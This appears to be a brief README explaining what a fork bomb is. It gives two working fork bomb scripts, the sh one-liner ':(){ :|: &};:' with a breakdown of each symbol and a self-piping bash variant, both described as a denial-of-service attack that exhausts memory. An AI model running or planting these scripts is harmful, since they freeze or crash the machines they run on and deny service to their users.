# What Is Fork Bomb??
    - A fork is a system call used in Unix and Linux systems that takes an existing process (a.k.a, a parent) and replicates it, forming a new process (a.k.a, a child). This allows both processes to carry out unique tasks simultaneously.
    
        <div align="center">OR</div>
    
    - Basically Fork Bomb Is A DOS Attack OS 
    In This It Will Consume MostOff Memory Of System And Eventually You Need To Hard Restart InOrder To Work With System


### Fork Bomb in .sh
```sh
#!/bin/sh
:(){ :|: &};:
```
The following characters comprise a basic Linux shell script used to launch a fork bomb:

    - :() – defines a function in Linux function, named :
    - { } – encloses the commands that a function will run
    - :|: – runs the command recursively, meaning the output is piped to another version of the - command that runs in a subshell
    - & – runs the preceding command in the background
    - ; – separates the function defining command to the left from the next command
    - : – runs the command, which is the newly created function – :

### Fork Bomb In .bash
```bash
#!/bin/bash
./$0|./$0 &
```



    